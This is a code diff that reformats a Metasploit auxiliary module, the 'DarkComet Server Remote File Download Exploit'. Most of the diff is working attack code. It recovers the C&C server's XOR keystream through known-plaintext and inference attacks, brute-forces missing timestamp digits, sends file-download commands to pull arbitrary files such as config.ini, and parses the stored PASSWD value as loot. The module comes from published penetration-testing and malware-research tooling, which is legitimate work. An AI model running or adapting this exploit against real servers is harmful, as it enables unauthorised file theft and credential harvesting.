@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -11,25 +12,24 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'DarkComet Server Remote File Download Exploit',
-      'Description'    => %q{
-        This module exploits an arbitrary file download vulnerability in the DarkComet C&C server versions 3.2 and up.
-        The exploit does not need to know the password chosen for the bot/server communication.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Shawn Denbow & Jesse Hertz', # Vulnerability Discovery
-          'Jos Wetzels' # Metasploit module, added support for versions < 5.1, removed need to know password via cryptographic attack
-        ],
-      'References'     =>
-        [
-          [ 'URL', 'https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/PEST-CONTROL.pdf' ],
-          [ 'URL', 'http://samvartaka.github.io/exploitation/2016/06/03/dead-rats-exploiting-malware' ]
-        ],
-      'DisclosureDate' => 'Oct 08 2012',
-      'Platform'       => 'win'
-    ))
+                      'Name'           => 'DarkComet Server Remote File Download Exploit',
+                      'Description'    => %q(
+                        This module exploits an arbitrary file download vulnerability in the DarkComet C&C server versions 3.2 and up.
+                        The exploit does not need to know the password chosen for the bot/server communication.
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                        [
+                          'Shawn Denbow & Jesse Hertz', # Vulnerability Discovery
+                          'Jos Wetzels' # Metasploit module, added support for versions < 5.1, removed need to know password via cryptographic attack
+                        ],
+                      'References'     =>
+                        [
+                          [ 'URL', 'https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/PEST-CONTROL.pdf' ],
+                          [ 'URL', 'http://samvartaka.github.io/exploitation/2016/06/03/dead-rats-exploiting-malware' ]
+                        ],
+                      'DisclosureDate' => 'Oct 08 2012',
+                      'Platform'       => 'win'))
 
     register_options(
       [
@@ -43,7 +43,8 @@ class MetasploitModule < Msf::Auxiliary
         OptBool.new('STORE_LOOT', [false, 'Store file in loot (will simply output file to console if set to false).', true]),
         OptInt.new('BRUTETIMEOUT', [false, 'Timeout (in seconds) for bruteforce attempts', 1])
 
-      ], self.class)
+      ], self.class
+    )
   end
 
   # Functions for XORing two strings, deriving keystream using known plaintext and applying keystream to produce ciphertext
@@ -64,9 +65,9 @@ class MetasploitModule < Msf::Auxiliary
 
   def use_keystream(plaintext, keystream)
     if keystream.length > plaintext.length
-      return xor_strings(plaintext, keystream[0, plaintext.length]).unpack('H*')[0].upcase
+      xor_strings(plaintext, keystream[0, plaintext.length]).unpack('H*')[0].upcase
     else
-      return xor_strings(plaintext, keystream).unpack('H*')[0].upcase
+      xor_strings(plaintext, keystream).unpack('H*')[0].upcase
     end
   end
 
@@ -162,11 +163,11 @@ class MetasploitModule < Msf::Auxiliary
         return nil
       end
 
-      if datastore['KEY'] != ''
-        a_msg = dc_encryptpacket('A', datastore['KEY'])
-      else
-        a_msg = use_keystream('A', keystream)
-      end
+      a_msg = if datastore['KEY'] != ''
+                dc_encryptpacket('A', datastore['KEY'])
+              else
+                use_keystream('A', keystream)
+              end
 
       sock.put(a_msg)
 
@@ -203,7 +204,7 @@ class MetasploitModule < Msf::Auxiliary
         msg = sock.get_once(1024)
       end
 
-      while (!msg.nil?) && (msg != '')
+      while !msg.nil? && (msg != '')
         filedata += msg
         if bruting
           begin
@@ -248,9 +249,7 @@ class MetasploitModule < Msf::Auxiliary
   # Carry out the crypto attack when we don't have a key
   def crypto_attack(exploit_string)
     getsin_msg = fetch_getsin
-    if getsin_msg.nil?
-      return nil
-    end
+    return nil if getsin_msg.nil?
 
     getsin_kp = 'GetSIN' + datastore['LHOST'] + '|'
     keystream = get_keystream(getsin_msg, getsin_kp)
@@ -288,7 +287,7 @@ class MetasploitModule < Msf::Auxiliary
         buffer_tail = 3
 
         # Actual inference attack happens here
-        while !target_offset_range.empty?
+        until target_offset_range.empty?
           getsin_observation[buffer_tail] = [fetch_getsin].pack('H*')
           Rex.sleep(0.5)
 
@@ -297,7 +296,7 @@ class MetasploitModule < Msf::Auxiliary
           target_offset_range.each do |x|
             index = buffer_head
 
-            while index != buffer_tail do
+            while index != buffer_tail
               next_index = (index + 1) % 4
 
               # The condition we impose is that observed character x has to differ between two observations and the character left of it has to differ in those same
@@ -314,9 +313,7 @@ class MetasploitModule < Msf::Auxiliary
           # Update circular buffer head & tail
           buffer_tail = (buffer_tail + 1) % 4
           # Move head to right once tail wraps around, discarding oldest item in circular buffer
-          if buffer_tail == buffer_head
-            buffer_head = (buffer_head + 1) % 4
-          end
+          buffer_head = (buffer_head + 1) % 4 if buffer_tail == buffer_head
         end
 
         # Inferrence attack done, reconstruct final keystream segment
@@ -338,16 +335,14 @@ class MetasploitModule < Msf::Auxiliary
 
       # Bruteforce first missing_bytecount bytes of timestamp (maximum of brute_max)
       charset = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
-      char_range = missing_bytecount.times.map { charset }
+      char_range = Array.new(missing_bytecount) { charset }
       char_range.first.product(*char_range[1..-1]) do |x|
         p = x.join
         candidate_plaintext = getsin_kp + p
         candidate_keystream = get_keystream(getsin_msg, candidate_plaintext) + inferrence_segment
         filedata = try_exploit(exploit_string, candidate_keystream, true)
 
-        if !filedata.nil?
-          return filedata
-        end
+        return filedata unless filedata.nil?
       end
       return nil
     end
@@ -356,29 +351,27 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def parse_password(filedata)
-    filedata.each_line { |line|
+    filedata.each_line do |line|
       elem = line.strip.split('=')
-      if elem.length >= 1
-        if elem[0] == 'PASSWD'
-          if elem.length == 2
-            return elem[1]
-          else
-            return ''
-          end
-        end
+      next unless elem.length >= 1
+      next unless elem[0] == 'PASSWD'
+      if elem.length == 2
+        return elem[1]
+      else
+        return ''
       end
-    }
-    return nil
+    end
+    nil
   end
 
   def run
     # Determine exploit string
     if datastore['NEWVERSION'] == true
-      if (datastore['TARGETFILE'] != '') && (datastore['KEY'] != '')
-        exploit_string = 'QUICKUP1|' + datastore['TARGETFILE'] + '|'
-      else
-        exploit_string = 'QUICKUP1|config.ini|'
-      end
+      exploit_string = if (datastore['TARGETFILE'] != '') && (datastore['KEY'] != '')
+                         'QUICKUP1|' + datastore['TARGETFILE'] + '|'
+                       else
+                         'QUICKUP1|config.ini|'
+                       end
     elsif (datastore['TARGETFILE'] != '') && (datastore['KEY'] != '')
       exploit_string = 'UPLOAD' + datastore['TARGETFILE'] + '|1|1|'
     else
@@ -386,11 +379,11 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # Run exploit
-    if datastore['KEY'] != ''
-      filedata = try_exploit(exploit_string, nil, false)
-    else
-      filedata = crypto_attack(exploit_string)
-    end
+    filedata = if datastore['KEY'] != ''
+                 try_exploit(exploit_string, nil, false)
+               else
+                 crypto_attack(exploit_string)
+               end
 
     # Harvest interesting credentials, store loot
     if !filedata.nil?
